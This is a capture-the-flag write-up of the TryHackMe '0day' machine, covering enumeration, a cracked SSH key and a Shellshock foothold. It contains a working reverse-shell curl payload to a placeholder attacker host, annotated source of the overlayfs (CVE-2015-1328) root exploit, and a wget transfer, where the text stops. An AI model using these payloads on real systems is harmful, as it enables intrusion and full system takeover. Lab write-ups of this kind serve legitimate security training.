---
title: "0day"
---

0day is a medium difficulty TryHackMe machine.
Enumeration reveals a `/backup` and a `/cgi-bin` directory.
The former contains a private ssh key.
Cracking it reveals a password but this is a rabbit hole.
Fuzzing the `/cgi-bin` directory reveals a cgi script.
This is vulnerable to CVE-2014-6271 because the server is running an outdated version of Apache.
Exploiting this gives us a foothold on the system.
Further enumeration reveals an old version of Ubuntu that is vulnerable to CVE-2015-1328.
Exploiting this lets us escalate our privileges to `root`.

**Note:** Personally identifying information, like the IP-s of attacking machines of VM-s, are replaced with placeholders for privacy and all flags or passwords are redacted to not spoil the challenge.

# Reconnaissance

## Nmap

We start with an `nmap` scan to map the target's attack surface:

```
# IP=<TARGET-IP>
# nmap -sS -sC -sV -O -p- -T4 -vv $IP -oA 0day
Starting Nmap 7.93 ( https://nmap.org ) at 2025-09-19 23:26 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
[…]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 5720823c62aa8f4223c0b893996f499c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c40db32640d110cef4fb85b739bc76b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f76f78d58352a64dda213c5547b72d6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 02:A0:1A:01:2D:4B (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
[…]
```

Both Apache and OpenSSH are outdated.
Indeed, Apache HTTP Server 2.4.7 was released back in [2013](https://lists.apache.org/thread/sg4hk3j975o0h5oxk58qmp5z13s4b0pg).

## Nikto

Next, we scan the target with `nikto` for vulnerabilities:

```
# nikto -h http://$IP -o 0day-nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          <TARGET-IP>
+ Target Hostname:    <TARGET-IP>
+ Target Port:        80
+ Start Time:         2025-09-19 23:29:03 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ 8699 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2025-09-19 23:29:20 (GMT0) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`nikto` found `/admin/index.html`, `/backup` and `/secret` directories.
It also found `/cgi-bin/test.cgi` which appears vulnerable to ShellShock (CVE-2014-6271)
Before confirming this finding, let's complete our initial enumeration.

## Gobuster

We also fuzz the server for files and directories with `gobuster`:

```
# gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 64 -e -x php,txt,
css,html,zip,bak -o 0day-gobuster-txt --no-error
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET-IP>
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,txt,css,html,zip,bak
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2025/09/19 23:30:00 Starting gobuster in directory enumeration mode
===============================================================
http://<TARGET-IP>/.htaccess.php        (Status: 403) [Size: 293]
http://<TARGET-IP>/.hta.php             (Status: 403) [Size: 288]
http://<TARGET-IP>/.hta.css             (Status: 403) [Size: 288]
http://<TARGET-IP>/.htpasswd.zip        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htpasswd.html       (Status: 403) [Size: 294]
http://<TARGET-IP>/.htpasswd.css        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htaccess.txt        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htpasswd            (Status: 403) [Size: 289]
http://<TARGET-IP>/.htaccess.bak        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htaccess.zip        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htaccess.html       (Status: 403) [Size: 294]
http://<TARGET-IP>/.htaccess.css        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htaccess            (Status: 403) [Size: 289]
http://<TARGET-IP>/.hta.bak             (Status: 403) [Size: 288]
http://<TARGET-IP>/.hta.zip             (Status: 403) [Size: 288]
http://<TARGET-IP>/.hta.html            (Status: 403) [Size: 289]
http://<TARGET-IP>/.hta.txt             (Status: 403) [Size: 288]
http://<TARGET-IP>/.hta                 (Status: 403) [Size: 284]
http://<TARGET-IP>/.htpasswd.bak        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htpasswd.txt        (Status: 403) [Size: 293]
http://<TARGET-IP>/.htpasswd.php        (Status: 403) [Size: 293]
http://<TARGET-IP>/admin                (Status: 301) [Size: 313] [--> http://<TARGET-IP>/admin/]
http://<TARGET-IP>/backup               (Status: 301) [Size: 314] [--> http://<TARGET-IP>/backup/]
http://<TARGET-IP>/cgi-bin              (Status: 301) [Size: 315] [--> http://<TARGET-IP>/cgi-bin/]
http://<TARGET-IP>/cgi-bin/             (Status: 403) [Size: 288]
http://<TARGET-IP>/cgi-bin/.html        (Status: 403) [Size: 293]
http://<TARGET-IP>/css                  (Status: 301) [Size: 311] [--> http://<TARGET-IP>/css/]
http://<TARGET-IP>/img                  (Status: 301) [Size: 311] [--> http://<TARGET-IP>/img/]
http://<TARGET-IP>/index.html           (Status: 200) [Size: 3025]
http://<TARGET-IP>/index.html           (Status: 200) [Size: 3025]
http://<TARGET-IP>/js                   (Status: 301) [Size: 310] [--> http://<TARGET-IP>/js/]
http://<TARGET-IP>/robots.txt           (Status: 200) [Size: 38]
http://<TARGET-IP>/robots.txt           (Status: 200) [Size: 38]
http://<TARGET-IP>/secret               (Status: 301) [Size: 314] [--> http://<TARGET-IP>/secret/]
http://<TARGET-IP>/server-status        (Status: 403) [Size: 293]
http://<TARGET-IP>/uploads              (Status: 301) [Size: 315] [--> http://<TARGET-IP>/uploads/]
Progress: 32175 / 32998 (97.51%)===============================================================
2025/09/19 23:30:03 Finished
===============================================================
```

## Web server

After a vulnerability scan and some fuzzing, we focus on the server and the site it's serving.
First we fetch the server headers to learn more about the software stack:

```
$ curl -sI http://$IP
HTTP/1.1 200 OK
Date: Fri, 19 Sep 2025 23:32:09 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Wed, 02 Sep 2020 17:11:56 GMT
ETag: "bd1-5ae57bb9a1192"
Accept-Ranges: bytes
Content-Length: 3025
Vary: Accept-Encoding
Content-Type: text/html
```

Looks like a personal website:

```
$ curl -s http://$IP | html2text | sed '/^\s*$/d'
[0day]
0day
Ryan Montgomery
Internet Marketer / Dev / Entrepreneur
```

We prefer to work in the terminal as much as possible.
So we use `curl` to fetch the site and `html2text` to render HTML in the terminal.
Since the original output contains empty lines (likely an image or a banner), we remove these with `sed '/^\s*$/d'`

The next step is to extract links from the HTML source code:

```
$ curl -s http://$IP | grep -oP "href=\"\K[^\"]+?(?=\")"
favicon.ico
https://use.fontawesome.com/releases/v5.11.2/css/all.css
https://fonts.googleapis.com/css?family=Righteous|Ubuntu+Mono&display=swap
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
css/main.css
https://instagram.com/0day
https://facebook.com/RyanMMontgomery
https://twitch.com/0day
https://linkedin.com/in/rapper
https://github.com/ryanrohypnol
```

This lets us both grab any links that fuzzing missed and to map how the website works from the terminal (e.g. links to other parts of the site, external sites for potential OSINT).
There's nothing else, like comments or interesting scripts, in the HTML.

In our experience, a terminal-based workflow suffices for enumerating simpler websites.
`curl` can provide fine-grained control for manipulating web requests by modifying HTTP header or parameter values.
Walking a site with Burp Suite becomes necessary for more complex sites or webapps that rely heavily on JavaScript or API-s.


## The SSH rabbit hole

`/backup/` contains a private SSH key:

```
# curl -s http://$IP/backup/
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
[...]
-----END RSA PRIVATE KEY-----
```

We write the key to a file:

```
# curl -s http://$IP/backup/ -o ssh_key.pem
```

Next, we prepare for cracking with `john`:

```
# ssh2john ssh_key.pem > ssh.hash
```

The key is easy to crack due to a weak password:

```
# john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (ssh_key.pem)
1g 0:00:00:00 DONE (2025-09-19 23:41) 12.50g/s 6400p/s 6400c/s 6400C/s genesis..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

A password is useless without a username.
Testing against the target with `nxc` and some of the names we gathered from the website enumeration yields nothing.

## CGI-bin

Common Gateway Interface (CGI) is a standard that lets servers communicate with external [programs](https://phoenixnap.com/kb/cgi-bin).
These let servers process input from and return output through the web.
`/cgi-bin` is a directory on a web server that contains the compiled binaries or scripts (written in Perl, Python or other languages) that allow a server to do this.

CGI-bin used to be a common way of processing user input on the server side and render the result in the user's browser.
This process starts with the browser sending a HTTP request to the server.
The server examines the request and determines which CGI script, if any, should handle it.
If a script is needed, the server locates it in the `/cgi-bin` directory and executes it.
The script uses the input data to perform necessary operations (e.g. generating dynamic content) and returns the output to the server in a format that it can send back to the browser in a HTTP response.

```
    ┌───────────────────────────────────────────────────────────────────┐
    v                                                                   │
+-------+ HTTP    +------+ Script    +---------+        +---------+     │
¦User's ¦ request ¦Web   ¦ execution ¦CGI-bin  ¦        ¦Generated¦     │
¦browser¦────────>¦Server¦──────────>¦Directory¦───────>¦output   ¦─────┘
+-------+         +------+           +---------+        +---------+
```

The `nikto` scan revealed that `/cgi-bin/test.cgi` exists.
(If you didn't run `nikto`, you can find the script by fuzzing `/cgi-bin`.)
Let's test if it executes:

```
# curl -s http://$IP/cgi-bin/test.cgi
Hello World!
```

## ShellShock

CGI maps http request headers into environment variables in the OS running the server and executing the script.
ShellShock (CVE-2014-6271) exploits how Bash handles function definitions that are imported through environment [variables](https://www.cisa.gov/news-events/alerts/2014/09/25/gnu-bourne-again-shell-bash-shellshock-vulnerability-cve-2014-6271-cve-2014-7169-cve-2014-7186-cve).

Technically, the vulnerability is simple - an attacker creates a special environment variable that starts with a function definition, `() { :; };`, and appends a malicious [command](https://www.huntress.com/threat-library/vulnerabilities/cve-2014-6271):

```
() { :; }; /bin/cat /etc/passwd
```

If a vulnerable version of Bash imports this function from an environment variable passed to it by CGI, it executes the appended command with the privileges of the user who owns the script or the subprocess initiated by the script.

We can use an `nmap` script to test if the target is vulnerable to [ShellShock](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html):

```
# nmap $IP -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi
Starting Nmap 7.93 ( https://nmap.org ) at 2025-09-19 23:53 UTC
Nmap scan report for ip-<TARGET-IP>.eu-west-1.compute.internal (<TARGET-IP>)
Host is up (0.00073s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685
MAC Address: 02:A0:1A:01:2D:4B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```

# Foothold

We can gain a foothold by exploiting ShellShock and inserting a reverse shell payload into the `User-Agent` header of a GET request to `/cgi-bin/test.cgi`.

First, start a listener:

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```
Second, send a GET request with `curl` and the payload in the `User-Agent` header:

```
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER-IP>/4444
 0>&1' http://$IP/cgi-bin/test.cgi
```

We catch shell as `www-data`:

```
Connection received on <TARGET-IP> 34176
bash: cannot set terminal process group (838): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Stabilize the `nc` shell for some quality of life improvements:

```
www-data@ubuntu:/usr/lib/cgi-bin$ which python3
which python3
/usr/bin/python3
www-data@ubuntu:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<i-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/usr/lib/cgi-bin$ ^Z
[1]+  Stopped                 nc -lvnp 4444
root@ip-<ATTACKER-IP>:~/0day# stty -a
speed 38400 baud; rows 46; columns 105; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>;
start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel
-iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho
-extproc
$ stty raw -echo; fg
nc -lvnp 4444

www-data@ubuntu:/usr/lib/cgi-bin$ export SHELL=/bin/bash
www-data@ubuntu:/usr/lib/cgi-bin$ export TERM=screen
www-data@ubuntu:/usr/lib/cgi-bin$ stty rows 46 columns 105
www-data@ubuntu:/usr/lib/cgi-bin$ reset
```

The next order of business is to enumerate all on users that have a login shell:

```
www-data@ubuntu:/usr/lib/cgi-bin$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
```

We find the user flag and that it is world-readable:

```
www-data@ubuntu:/usr/lib/cgi-bin$ find / -type f -name user.txt -ls 2>/dev/null
660310    4 -rw-rw-r--   1 ryan     ryan           22 Sep  2  2020 /home/ryan/user.txt
```

`/home/ryan` contains nothing interesting besides the flag so we grab it:

```
www-data@ubuntu:/usr/lib/cgi-bin$ ls -lah /home/ryan
total 28K
drwxr-xr-x 3 ryan ryan 4.0K Sep  2  2020 .
drwxr-xr-x 3 root root 4.0K Sep  2  2020 ..
lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
-rw-r--r-- 1 ryan ryan 3.6K Sep  2  2020 .bashrc
drwx------ 2 ryan ryan 4.0K Sep  2  2020 .cache
-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
www-data@ubuntu:/usr/lib/cgi-bin$ cat /home/ryan/user.txt
<REDACTED-USER-FLAG>
```

# Privilege escalation: www-data > root

## Reconnaissance

`/home` contains a hidden file, `.secret`, which is a symbolic link to the root flag but we can't read it:

```
www-data@ubuntu:/usr/lib/cgi-bin$ ls -lah /home
total 12K
drwxr-xr-x  3 root root 4.0K Sep  2  2020 .
drwxr-xr-x 22 root root 4.0K Sep  2  2020 ..
lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -> /root/root.txt
drwxr-xr-x  3 ryan ryan 4.0K Sep  2  2020 ryan
www-data@ubuntu:/usr/lib/cgi-bin$ cat /home/.secret
cat: /home/.secret: Permission denied
```

Besides Apache, the machine is also running an old version of Ubuntu:

```
www-data@ubuntu:/usr/lib/cgi-bin$ (cat /proc/version || uname -a)
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014
www-data@ubuntu:/usr/lib/cgi-bin$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

This version of the Linux kernel has an overlayfs vulnerability (CVE-2015-1328):

```
$ searchsploit linux 3.13
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
[\u2026]
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlay | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlay | linux/local/37293.txt
[\u2026]
```

OverlayFS (Overlay Filesystem) is a union mount filesystem introduced in the Linux kernel 3.18 in [2014](https://www.thelinuxvault.net/blog/introduction-to-the-overlayfs/).
To create this filesystem, OverlayFS utilizes four kinds of directories:

- **Lower directories**: read-only base layers that contain the original data, which remain unmodified.
- **Upper directory**: a writeable layer that contains all changes of the base layer (file creations, deletions, modifications) but not all base layer data.
- **Work directory**: a temporary directory that manages the copy-up process when files in the base layer are modified.
- **Merged directory**: the directory that users interact with; it appears to contain all files and directories from the lower as well as the upper layers.

This is illustrated in the following [diagram](https://linuxconfig.org/introduction-to-the-overlayfs):

```
+------------------------------------------+
¦+-----+    +-----+     +-----+     +-----+¦
¦¦File1¦    ¦File2¦     ¦File3¦     ¦File4¦¦    MERGED
¦+-----+    +-----+     +-----+     +-----+¦
+------------------------------------------+

+------------------------------------------+
¦           +-----+                 +-----+¦
¦           ¦File2¦                 ¦File4¦¦    UPPER
¦           +-----+                 +-----+¦
+------------------------------------------+

+------------------------------------------+
¦+-----+    +-----+     +-----+            ¦
¦¦File1¦    ¦File2¦     ¦File3¦            ¦    LOWER
¦+-----+    +-----+     +-----+            ¦
+------------------------------------------+
```

If a user attempts to read `File2`, OverlayFS checks if it exists in the upper layer, finds it and returns its contents.
If they attempt to read `File1`, OverlayFS checks if it exists in the upper layer, fails to find it, looks in the lower layer, finds it and returns the contents.

When a user writes to a new file, OverlayFS creates it in the upper directory.
However, when a user writes to an exiting file in the write-protected lower directory, OverlayFS performs a copy-up operation by copying the file from the lower to the upper directory.
Any modifications are written to this new copy.

CVE-2015-1328 is a vulnerability in the copy-up operation.
In Linux kernel versions [3.19.0-21.21](https://nvd.nist.gov/vuln/detail/cve-2015-1328) in Ubuntu 12.04-15.04, overlayfs doesn't check the permissions [correctly](https://seclists.org/oss-sec/2015/q2/717):

> The only permissions that are checked is if the owner of the file that is being modified has permission to write to the upperdir.
> Furthermore, when a file is copied from the lowerdir the file metadata is carbon copied, instead of attributes such as owner being changed to the user that triggered the copy_up_* procedures.

This lets an attacker create, modify or read sensitive files.
Suppose we want to access the root-owned `/etc/shadow`:

1. Create a new namespace together wit the requisite `upper`, `work` and `merged` directories.
2. Create an overlayfs with `/etc` as lower directory: `mount -t overlay overlay -o lowerdir=/etc,upperdir=upper,workdir=work merged`
3. Give `work/work` read, write and execute permissions for everyone: `chmod 777 work/work`.
4. Rename `shadow` to `copy_of_shadow` to copy-up the original file from the lower read-only `/etc` directory into the `upper` directory: `mv shadow copy_of_shadow` and exit the namespace.
5. Due to incorrect permissions checks, `upper/copy_of_shadow` retains its original ownership and permissions.
6. Create another namespace and an overlayfs with `upper` as the lower directory, `/etc` as the upper directory: `mount -t overlay overlay -o lowerdir=upper,upperdir=/etc,workdir=work merged`.
7. `chmod 777 work/work` again and `chmod 777 merged/copy_of_shadow` to copy-up a modified version with read-write-execute permissions for everyone into `/etc` and effectively replace the original file.
8. Exit the namespace and confirm that a copy with new permissions is in `/etc`.


The exploit (`37292.c`), written in C, abuses user namespaces, OverlayFS and the dynamic linker (`ld.so`) to get a root shell.

The reverse shell payload is stored in the `LIB` variable as a stringified C snippet that is designed to be compiled into a shared (`.so`) object:

```
#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"
```

This payload basically checks if the current process is `/bin/su` and is running as root (`geteuid() == 0`).
If these conditions are met, it executes a shell via `execle("/bin/sh"...)`.

`child_exec()` essentially performs steps 1-7 above with `/tmp/ns_sploit` as the parent directory for the `upper` and other directories to perform a [library injection attack](https://github.com/AmirHoseinTangsiriNET/LDSoPreload-LibraryInjection/):

```
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}
```

`main()` calls `child_exec` via `clone()` with `clone_newns |sigchld` flag to create a new mount namespace and allow signal forwarding so as to isolate the child process from the parent:

```
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");
[...]
```

It performs a library injection by creating a `/etc/ld.so.preload` file - a system-wide counterpart to the `LD_PRELOAD` environment variable that contains absolute paths to shared-object libraries that the dynamic linker loads into the address space of every dynamically linked [program](https://forenza.io/linux-ld-so-preload/)- that points to a shared object library containing the payload stored in `LIB`:

```
[...]
    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
```

## Privilege escalation

Get the exploit source code from `searchsploit`:

```
$ searchsploit -m 37292
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /opt/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines
Copied to: /root/0day/37292.c
```

Rename it for ease of use:

```
$ mv 37292.c ofs.c
```

Start a server on the attacking machine to transfer the exploit to the target:

```
$ python3 -m http.server 8080
```

On target, download the exploit from our server:

```
www-data@ubuntu:/tmp$ wget http://<ATTACKER-IP>:8080/ofs.c
--2025-09-19 17:36:39--  http://<ATTACKER-IP>:8080/ofs.c
Connecting to <ATTACKER-IP>:8080... connected.
